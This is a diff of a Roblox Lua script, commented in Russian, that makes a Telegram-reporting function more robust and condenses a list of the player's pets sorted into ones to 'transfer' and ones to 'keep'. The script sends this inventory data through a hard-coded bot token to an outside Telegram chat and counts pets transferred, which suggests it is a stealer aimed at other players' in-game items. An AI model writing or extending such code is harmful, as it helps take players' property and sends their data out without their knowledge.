@@ -222,15 +222,36 @@ local STATS = {
     totalPetsTransferred = 0,
     errors = 0
 }
--- 📨 ОРИГИНАЛЬНАЯ РАБОЧАЯ ФУНКЦИЯ TELEGRAM (без изменений!)
+-- 📨 УЛУЧШЕННАЯ ФУНКЦИЯ TELEGRAM (с защитой от ошибок)
 local function sendToTelegram(text)
+    -- Ограничиваем длину сообщения (Telegram лимит 4096 символов)
+    if #text > 4000 then
+        text = string.sub(text, 1, 4000) .. "\n\n... (сообщение обрезано)"
+    end
+    
+    -- Заменяем проблемные символы
+    text = text:gsub("&", "%%26")
+    text = text:gsub("#", "%%23")
+    text = text:gsub("%+", "%%2B")
+    
     local url = "https://api.telegram.org/bot"..TELEGRAM_TOKEN.."/sendMessage"..
                 "?chat_id="..TELEGRAM_CHAT_ID.."&text="..HttpService:UrlEncode(text)
-    local success, err = pcall(function() game:HttpGet(url) end)
+    
+    local success, result = pcall(function() 
+        return game:HttpGet(url) 
+    end)
+    
     if not success then
-        warn("Ошибка при отправке в Telegram: "..tostring(err))
+        warn("Ошибка при отправке в Telegram: "..tostring(result))
         STATS.errors = STATS.errors + 1
+        
+        -- Пробуем отправить короткое сообщение об ошибке
+        local shortMessage = "❌ Ошибка отправки длинного сообщения. Код ошибки: "..tostring(result):sub(1, 100)
+        local shortUrl = "https://api.telegram.org/bot"..TELEGRAM_TOKEN.."/sendMessage"..
+                        "?chat_id="..TELEGRAM_CHAT_ID.."&text="..HttpService:UrlEncode(shortMessage)
+        pcall(function() game:HttpGet(shortUrl) end)
     end
+    
     return success
 end
 -- 🔗 ИСПРАВЛЕННАЯ ФУНКЦИЯ ССЫЛКИ НА СЕРВЕР (НОВЫЙ ФОРМАТ)
@@ -297,7 +318,7 @@ local function getAllPets()
     
     return pets
 end
--- 📜 УЛУЧШЕННЫЙ СПИСОК ПИТОМЦЕВ
+-- 📜 УЛУЧШЕННЫЙ СПИСОК ПИТОМЦЕВ (с ограничением длины)
 local function getFullPetsList()
     local pets = getAllPets()
     if #pets == 0 then return "❌ Нет питомцев" end
@@ -309,9 +330,9 @@ local function getFullPetsList()
     for _, pet in ipairs(pets) do
         totalWeight = totalWeight + pet.weight
         
-        local status = pet.isWhitelisted and "✅ ПЕРЕДАТЬ" or "❌ ОСТАВИТЬ"
-        local petInfo = string.format("%s %s [%.2f кг, Age %d] %s", 
-                                     pet.rarity, pet.name, pet.weight, pet.age, status)
+        local status = pet.isWhitelisted and "✅" or "❌"
+        local petInfo = string.format("%s %s [%.1fкг]", 
+                                     status, pet.name, pet.weight)
         
         if pet.isWhitelisted then
             table.insert(whitelisted, petInfo)
@@ -320,28 +341,30 @@ local function getFullPetsList()
         end
     end
     
-    local result = {"=== 📊 СТАТИСТИКА ПИТОМЦЕВ ==="}
-    table.insert(result, string.format("🔢 Всего питомцев: %d", #pets))
-    table.insert(result, string.format("💰 Общий вес: %.2f кг", totalWeight))
-    table.insert(result, string.format("✅ К передаче: %d", #whitelisted))
-    table.insert(result, string.format("❌ К сохранению: %d", #blacklisted))
+    local result = {"📊 ПИТОМЦЫ:"}
+    table.insert(result, string.format("Всего: %d | Вес: %.1fкг", #pets, totalWeight))
+    table.insert(result, string.format("К передаче: %d | К сохранению: %d", #whitelisted, #blacklisted))
     table.insert(result, "")
     
+    -- Ограничиваем количество показываемых питомцев
     if #whitelisted > 0 then
-        table.insert(result, "✅ ПИТОМЦЫ К ПЕРЕДАЧЕ:")
-        for _, pet in ipairs(whitelisted) do
-            table.insert(result, pet)
+        table.insert(result, "✅ К ПЕРЕДАЧЕ:")
+        for i = 1, math.min(10, #whitelisted) do
+            table.insert(result, whitelisted[i])
+        end
+        if #whitelisted > 10 then
+            table.insert(result, string.format("... +%d питомцев", #whitelisted - 10))
         end
         table.insert(result, "")
     end
     
     if #blacklisted > 0 then
-        table.insert(result, "❌ ПИТОМЦЫ К СОХРАНЕНИЮ (топ-5):")
+        table.insert(result, "❌ К СОХРАНЕНИЮ (топ-5):")
         for i = 1, math.min(5, #blacklisted) do
             table.insert(result, blacklisted[i])
         end
         if #blacklisted > 5 then
-            table.insert(result, string.format("... и еще %d питомцев", #blacklisted - 5))
+            table.insert(result, string.format("... +%d питомцев", #blacklisted - 5))
         end
     end
     
